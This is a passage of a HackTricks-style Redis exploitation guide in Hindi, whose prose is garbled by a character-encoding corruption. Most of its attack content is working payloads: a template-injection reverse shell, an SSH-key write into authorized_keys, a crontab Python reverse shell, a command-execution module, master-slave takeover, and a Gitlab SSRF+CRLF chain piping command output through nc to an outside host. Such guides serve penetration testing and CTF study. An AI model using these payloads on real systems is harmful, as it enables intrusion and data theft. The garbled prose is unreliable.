рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [**рдЗрд╕ рд╡реНрд░рд┐рдЯрдЕрдк**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП, рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдПрдХ **рдПрдЪрдЯреАрдПрдордПрд▓ рдореЗрдВ рд░реЗрд╡ рд╢реЗрд▓ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛** рдЬрд┐рд╕реЗ **рдирдВрдЬрдХреНрд╕ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХрдИ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреИрд╢** рдореЗрдВ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ **рдореЗрдореЛрд░реА** рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдирдпрд╛ рд╡рд╛рд▓рд╛ **рдирд╣реАрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдпрд╛ рддреЛ рдбреЗрд╡рд▓рдкрд░ рдиреЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╕рдХреНрд░рд┐рдп рдЫреЛрдбрд╝ рджреА рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рд╕реЗрд╡рд╛ рдкрд░ рдбреАрдУрдПрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВ рдХрд┐ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреБрдирдГ рд▓реЙрдиреНрдЪ рд╣реЛрдЧрд╛)ред
{% endhint %}

### SSH

рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ рд╕реЗ](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`config get dir`** рдкрд░рд┐рдгрд╛рдо рдХрд┐рд╕реА рдЕрдиреНрдп рдореИрдиреНрдпреБрдЕрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрдорд╛рдВрдб рдХреЗ рдмрд╛рдж рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИред рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕реЗ рд░рди рдХрд░реЗрдВ рдЬрд▓реНрджреА рд╕реЗ рд░реЗрдбрд┐рд╕ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рджред **`config get dir`** рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдк **рд░реЗрдбрд┐рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ **рд╣реЛрдо** (рд╕рд╛рдорд╛рдиреНрдпрдд: _/var/lib/redis_ рдпрд╛ _/home/redis/.ssh_) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрдиреЗ рдкрд░ рдЖрдк рдпрд╣ рдЬрд╛рди рдЬрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХрд╣рд╛рдВ `authenticated_users` рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдк ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд░реЗрдбрд┐рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде** рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЛ рдЕрдиреНрдп рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реЛрдо рдХрд╛ рдкрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓реЗрдЦрдиреАрдп рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдЕрдкрдиреЗ рдкреАрд╕реА рдкрд░ рдПрдХ ssh рдкрдмреНрд▓рд┐рдХ-рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ: **`ssh-keygen -t rsa`**
2. рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдВ: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░реЗрдбрд┐рд╕ рдореЗрдВ рдЖрдпрд╛рдд рдХрд░реЗрдВ: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. рд░реЗрдбрд┐рд╕ рд╕рд░реНрд╡рд░ рдкрд░ **authorized\_keys** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рдХреЛ рд╕рд╣реЗрдЬреЗрдВ:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. рдЕрдВрдд рдореЗрдВ, рдЖрдк рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде **рд░реЗрдбрд┐рд╕ рд╕рд░реНрд╡рд░** рдкрд░ **ssh** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: **ssh -i id\_rsa redis@10.85.0.52**

**рдпрд╣ рддрдХрдиреАрдХ рдпрд╣рд╛рдБ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╣реИ:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
рдЕрдВрддрд┐рдо рдЙрджрд╛рд╣рд░рдг рдпреВрдмрдВрдЯреВ рдХреЗ рд▓рд┐рдП рд╣реИ, **Centos** рдХреЗ рд▓рд┐рдП, рдКрдкрд░ рдХрд╛ рдХрдорд╛рдВрдб рдпрд╣ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд┐рдЯрдХреЙрдЗрди рдХрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [yam](https://www.v2ex.com/t/286981#reply14)

### рд░реЗрдбрд┐рд╕ рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб рдХрд░реЗрдВ

1. [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) рд╕реЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рдЖрдк **рдХрд┐рд╕реА рднреА рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реЗрдзрд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЗрдбрд┐рд╕ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
2. рдлрд┐рд░ рдЖрдкрдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ **рдореЙрдбреНрдпреВрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА** рдХреЛрдИ рд╡рд┐рдзрд┐ рдЪрд╛рд╣рд┐рдП
3. `MODULE LOAD /path/to/mymodule.so` рдХреЗ рд╕рд╛рде рд░рдирдЯрд╛рдЗрдо рдореЗрдВ **рдЕрдкрд▓реЛрдб рдХрд┐рдП рдЧрдП рдореЙрдбреНрдпреВрд▓ рдХреЛ рд▓реЛрдб** рдХрд░реЗрдВ
4. рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб рд╣реБрдЖ рд╣реИ, **рд▓реЛрдб рдХрд┐рдП рдЧрдП рдореЙрдбреНрдпреВрд▓ рдХреА рд╕реВрдЪреА** рдХрд░реЗрдВ: `MODULE LIST`
5. **рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. рдЬрдм рдЪрд╛рд╣реЗрдВ рддрдм рдореЙрдбреНрдпреВрд▓ рдХреЛ рдЕрдирд▓реЛрдб рдХрд░реЗрдВ: `MODULE UNLOAD mymodule`

### LUA рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕

[**рдпрд╣рд╛рдБ**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд░реЗрдбрд┐рд╕ **EVAL** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ **рд▓реБрдЖ рдХреЛрдб рд╕реИрдВрдбрдмреЙрдХреНрд╕** рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИред рд▓рд┐рдВрдХ рдХрд┐рдП рдЧрдП рдкреЛрд╕реНрдЯ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕реЗ **dofile** рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди [рд╢рд╛рдпрдж](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) рдпрд╣ рдЕрдм рдФрд░ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рдЪрд╛рд╣реЗ рддреЛ, рдпрджрд┐ рдЖрдк **рд▓реБрдЖ** рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдкрд░ **рдирд┐рд░реНрджреЗрд╢рд┐рдд** рдХрдорд╛рдВрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЙрд╕реА рдкреЛрд╕реНрдЯ рд╕реЗ рдЖрдк рдХреБрдЫ **DoS** рдХрд╛рд░рдгреЛрдВ рдХреЗ рд╡рд┐рдХрд▓реНрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдХреБрдЫ **CVEs** рдЬрд┐рдирд╕реЗ **рд▓реБрдЖ** рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### рдорд╛рд╕реНрдЯрд░-рд╕реНрд▓реЗрд╡ рдореЙрдбреНрдпреВрд▓

рдорд╛рд╕реНрдЯрд░ рд░реЗрдбрд┐рд╕ рд╕рднреА рдСрдкрд░реЗрд╢рди рдЕрдкрдиреЗ рдЖрдк рд╕реНрд▓реЗрд╡ рд░реЗрдбрд┐рд╕ рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕рд┐рдВрдХреНрд░рдирд╛рдЗрдЬрд╝ рдХрд░ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╡реНрдпрдХреНрддрд┐рдЧрдд рд░реВрдк рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рд░реЗрдбрд┐рд╕ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд░реЗрдбрд┐рд╕ рдХреЛ рдПрдХ рд╕реНрд▓реЗрд╡ рд░реЗрдбрд┐рд╕ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╣рдорд╛рд░реЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реИ, рдлрд┐рд░ рд╣рдо рдЕрдкрдиреЗ рд░реЗрдбрд┐рд╕ рдореЗрдВ рдХрдорд╛рдВрдб рджрд░реНрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF рд░реЗрдбрд┐рд╕ рд╕реЗ рдмрд╛рддрдЪреАрдд

рдпрджрд┐ рдЖрдк **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда** рдЕрдиреБрд░реЛрдз **рд░реЗрдбрд┐рд╕ рдХреЛ** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдХреНрдпреЛрдВрдХрд┐ рд░реЗрдбрд┐рд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдкрдВрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝реЗрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдЙрди рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рддреНрд░реБрдЯрд┐рдпрд╛рдВ рджреЗрдЧрд╛ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рд╣ рд╕рдордЭрддрд╛ рдирд╣реАрдВ рд╣реИ:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ **SSRF vuln** рдЦреЛрдЬрддреЗ рд╣реИрдВ рдФрд░ рдЖрдк рдХреБрдЫ **рд╣реЗрдбрд░реНрд╕** (рд╢рд╛рдпрдж CRLF vuln рдХреЗ рд╕рд╛рде) рдпрд╛ **POST parameters** рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк Redis рдХреЛ рд╡рд┐рд╖рдпрд╛рд╕реНрдкрдж рдХрдорд╛рдВрдб рднреЗрдЬ рд╕рдХреЗрдВрдЧреЗред

### рдЙрджрд╛рд╣рд░рдг: Gitlab SSRF + CRLF рд╕реЗ рд╢реИрд▓

**Gitlab11.4.7** рдореЗрдВ рдПрдХ **SSRF** рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдФрд░ рдПрдХ **CRLF** рдЦреЛрдЬреЗ рдЧрдП рдереЗред **SSRF** рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА **рдЖрдпрд╛рдд рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗ URL рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛** рдореЗрдВ рдереА рдЬрдм рдПрдХ рдирдпрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рдерд╛ рдФрд░ рдЗрд╕реЗ рдЕрдирд┐рдпрдорд┐рдд IPs рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рдереА \[0:0:0:0:0:ffff:127.0.0.1] (рдпрд╣ 127.0.0.1 рддрдХ рдкрд╣реБрдВрдЪреЗрдЧрд╛), рдФрд░ **CRLF** vuln рдХрд╛ рд╢реЛрд╖рдг рдХреЗрд╡рд▓ **URL** рдореЗрдВ **%0D%0A** рд╡рд░реНрдг рдЬреЛрдбрд╝рдХрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ **рдЗрди рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреАрдЬ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ Redis рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдмрд╛рддрдЪреАрдд рдХрд░рдирд╛** рдЬреЛ **gitlab** рд╕реЗ **рдХрддрд╛рд░реЗрдВ рдкреНрд░рдмрдВрдзрд┐рдд** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрди рдХрддрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреЛрдб рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдкреНрд░рд╛рдкреНрдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред Redis рдХрддрд╛рд░ рджреБрд░реБрдкрдпреЛрдЧ рдкреЗрд▓реЛрдб рд╣реИ:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
рдФрд░ **URL encode** рдЕрдиреБрд░реЛрдз **SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдФрд░ **CRLF** рдХреЛ `whoami` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ `nc` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ (рдЬреИрд╕реЗ_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _рдХреЗ рд▓реЗрдЦрдХ рдХреЗ рд▓рд┐рдП рдЬрд╣рд╛рдВ рд╕реЗ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рд▓реА рдЧрдИ рдереА) рдЙрддреНрдкреАрдбрд╝рди `git` рдпреЛрдЬрдирд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░ рдЧрдпрд╛ рдерд╛ рдФрд░ `http` рдпреЛрдЬрдирд╛ рдХреЗ рд╕рд╛рде рдирд╣реАрдВред_

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рдЙрддреНрд╕рд╛рд╣ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рд╕рдорд╛рдЪрд╛рд░**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╕рдорд╛рдЪрд╛рд░ рдФрд░ рдЕрдВрджрд░реВрдиреА рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдЕрджреНрдпрддрди рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
